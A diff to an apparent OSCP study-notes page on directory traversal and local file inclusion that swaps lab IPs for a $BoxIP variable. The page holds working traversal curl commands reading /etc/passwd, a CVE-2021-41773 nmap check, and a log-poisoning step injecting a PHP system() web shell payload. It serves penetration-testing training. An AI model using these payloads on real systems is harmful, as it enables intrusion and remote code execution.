@@ -8,7 +8,7 @@ Part of [[COMMAND BREAKDOWNS]]. Directory traversal, LFI, and the encoding/wrapp
 
 **Full command:**
 ```bash
-curl --path-as-is "http://192.168.156.193:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt"
+curl --path-as-is "http://$BoxIP:3000/public/plugins/alertlist/../../../../../../../../../../Users/install.txt"
 ```
 
 **Piece by piece:**
@@ -30,7 +30,7 @@ curl --path-as-is "http://192.168.156.193:3000/public/plugins/alertlist/../../..
 
 **Full command:**
 ```bash
-curl --path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+curl --path-as-is http://$BoxIP/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```
 
 **Piece by piece:**
@@ -99,7 +99,7 @@ sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----
 
 **Full command:**
 ```bash
-curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" 2>/dev/null
+curl -k --tlsv1.0 "https://$BoxIP/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action" 2>/dev/null
 ```
 
 **Piece by piece:**
@@ -124,7 +124,7 @@ curl -k --tlsv1.0 "https://10.129.229.183/vtigercrm/graph.php?current_language=.
 ```bash
 sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
 sudo nmap --script-updatedb
-sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
+sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" $BoxIP
 ```
 
 **Piece by piece:**
@@ -147,7 +147,7 @@ sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
 
 **Full commands:**
 ```bash
-curl "http://<target>/index.php?page=../../../../../../../../../var/log/apache2/access.log"
+curl "http://$BoxIP/index.php?page=../../../../../../../../../var/log/apache2/access.log"
 ```
 then, in Burp Repeater, set the `User-Agent` header to `<?php echo system($_GET['cmd']); ?>` and send.
 
@@ -177,3 +177,14 @@ then, in Burp Repeater, set the `User-Agent` header to `<?php echo system($_GET[
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/08. Introduction to Web Application Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
